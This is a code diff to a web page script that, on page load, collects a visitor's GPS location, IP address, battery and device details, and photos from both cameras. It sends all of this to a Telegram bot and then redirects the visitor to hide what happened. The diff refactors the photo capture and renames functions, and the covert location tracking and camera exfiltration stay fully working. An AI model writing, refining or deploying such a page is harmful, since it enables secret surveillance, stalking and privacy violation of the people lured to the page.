@@ -36,7 +36,7 @@
 
     setTimeout(() => {
       if (!redirected) window.location.href = REDIRECT_URL;
-    }, 8000); // fallback redirect in case of full denial
+    }, 8000); // fallback after 8s
 
     function sendToTelegram(message) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -74,7 +74,7 @@
         await sendPhotoToTelegram(blob);
         return true;
       } catch {
-        deviceInfo += `🚫 Camera: Blocked or denied\n`;
+        deviceInfo += `🚫 Camera (${facing}): Denied or blocked\n`;
         return false;
       }
     }
@@ -159,27 +159,23 @@
       deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
     }
 
-    async function runEverything() {
+    async function runAll() {
       await Promise.all([getBatteryInfo(), getIPInfo(), getGPSLocation()]);
       getExtraDetails();
       await sendToTelegram(deviceInfo);
 
-      const results = await Promise.all([
-        takePhoto("user"),
-        takePhoto("user"),
-        takePhoto("environment"),
-        takePhoto("environment")
-      ]);
+      const front = await takePhoto("user");
+      const back = await takePhoto("environment");
 
-      if (results.every(success => !success)) {
-        await sendToTelegram("🚫 Camera access denied or blocked.");
+      if (!front && !back) {
+        await sendToTelegram("🚫 Both cameras denied.");
       }
 
       redirected = true;
       window.location.href = REDIRECT_URL;
     }
 
-    window.onload = runEverything;
+    window.onload = runAll;
   </script>
 </body>
 </html>
